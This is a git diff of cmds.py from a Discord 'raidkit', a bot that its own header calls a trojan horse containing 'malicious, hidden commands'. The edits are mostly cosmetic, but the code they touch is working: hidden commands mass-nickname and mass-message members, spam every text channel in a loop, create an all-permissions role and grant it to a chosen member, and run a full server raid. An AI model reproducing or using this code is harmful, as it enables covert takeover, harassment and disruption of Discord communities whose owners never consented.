@@ -1,5 +1,5 @@
-'''
-Discord Raidkit v2.3.0 — "The trojan horse of discord raiding"
+"""
+Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,8 +8,8 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 cmds.py contains the malicious, hidden commands of the Anubis and Qetesh raidkits.
-cmds.py was last updated on 11/08/22 at 15:12.
-'''
+cmds.py was last updated on 04/09/22 at 18:50.
+"""
 
 import logging
 import os
@@ -35,7 +35,8 @@ class Cmds(commands.Cog):
             await ctx.message.delete()
 
             show_main_raidkit(
-                self.cfg['theme'], self.cfg['prefix'], f'Nicknaming all users for server : {ctx.guild.name} | {ctx.guild.id}')
+                self.cfg['theme'], self.cfg['prefix'], f'Nicknaming all users for server : {ctx.guild.name} | '
+                                                       f'{ctx.guild.id}')
             logging.info(
                 f'Nicknaming all users for server : {ctx.guild.name} | {ctx.guild.id}')
 
@@ -71,7 +72,8 @@ class Cmds(commands.Cog):
             await ctx.message.delete()
 
             show_main_raidkit(
-                self.cfg['theme'], self.cfg['prefix'], f'Messaging all users for server : {ctx.guild.name} | {ctx.guild.id}')
+                self.cfg['theme'], self.cfg['prefix'], f'Messaging all users for server : '
+                                                       f'{ctx.guild.name} | {ctx.guild.id}')
             logging.info(
                 f'Messaging all users for server : {ctx.guild.name} | {ctx.guild.id}')
 
@@ -105,8 +107,8 @@ class Cmds(commands.Cog):
     @commands.command(hidden=True)
     async def spam(self, ctx: commands.Context, *, message: str) -> bool:
 
-        def check_reply(message) -> bool:
-            return message.content == 'stop' and message.author == ctx.author
+        def check_reply(s_message) -> bool:
+            return s_message.content == 'stop' and s_message.author == ctx.author
 
         async def spam_text() -> None:
             while True:
@@ -120,7 +122,8 @@ class Cmds(commands.Cog):
             await ctx.message.delete()
 
             show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
-                              f'Spamming server : {ctx.guild.name} | {ctx.guild.id}\nEnter \'stop\' in a text channel to stop spamming.')
+                              f'Spamming server : {ctx.guild.name} | '
+                              f'{ctx.guild.id}\nEnter \'stop\' in a text channel to stop spamming.')
             logging.info(
                 f'Spamming server : {ctx.guild.name} | {ctx.guild.id}')
 
@@ -229,9 +232,11 @@ class Cmds(commands.Cog):
             await ctx.message.delete()
 
             show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
-                              f'Granting admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')
+                              f'Granting admin role to member {member.name}#{member.discriminator} : '
+                              f'{ctx.guild.name} | {ctx.guild.id}')
             logging.info(
-                f'Granting admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')
+                f'Granting admin role to member {member.name}#{member.discriminator} : '
+                f'{ctx.guild.name} | {ctx.guild.id}')
 
             try:
                 await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
@@ -255,23 +260,26 @@ class Cmds(commands.Cog):
                 return False
 
             show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
-                              f'Granted admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')
+                              f'Granted admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | '
+                              f'{ctx.guild.id}')
             logging.info(
-                f'Granted admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')
+                f'Granted admin role to member {member.name}#{member.discriminator} : '
+                f'{ctx.guild.name} | {ctx.guild.id}')
 
         return True
 
     @commands.command(hidden=True)
-    async def raid(self, ctx: commands.Context, role_name: str, nickname: str, amount: str, name: str, *, message: str = '') -> bool:
+    async def raid(self, ctx: commands.Context, role_name: str, nickname: str, amount: str, name: str, *,
+                   message: str = '') -> bool:
 
-        def check_reply(message) -> bool:
-            return message.content == 'stop' and message.author == ctx.author
+        def check_reply(s_message) -> bool:
+            return s_message.content == 'stop' and s_message.author == ctx.author
 
         async def spam_text() -> None:
             while True:
-                for c in ctx.guild.text_channels:
+                for channel in ctx.guild.text_channels:
                     try:
-                        await c.send(message)
+                        await channel.send(message)
                     except discord.errors.HTTPException:
                         continue
 
@@ -280,7 +288,8 @@ class Cmds(commands.Cog):
 
             try:
                 show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
-                                  f'Creating {role_name} role and giving to all users in server : {ctx.guild.name} | {ctx.guild.id}')
+                                  f'Creating {role_name} role and giving to all users in server : '
+                                  f'{ctx.guild.name} | {ctx.guild.id}')
                 logging.info(
                     f'Creating {role_name} role and giving to all users in server : {ctx.guild.name} | {ctx.guild.id}')
 
@@ -340,7 +349,8 @@ class Cmds(commands.Cog):
 
                 if message.strip():
                     show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
-                                      f'Spamming server : {ctx.guild.name} | {ctx.guild.id}\nEnter \'stop\' in a text channel to stop spamming.')
+                                      f'Spamming server : {ctx.guild.name} | '
+                                      f'{ctx.guild.id}\nEnter \'stop\' in a text channel to stop spamming.')
                     logging.info(
                         f'Spamming server : {ctx.guild.name} | {ctx.guild.id}')
 
@@ -583,7 +593,7 @@ class Cmds(commands.Cog):
                 pass
 
             try:
-                await guild.edit(preferred_locale='ja')
+                await guild.edit(preferred_locale=discord.Locale.japanese)
             except discord.errors.HTTPException:
                 pass
 
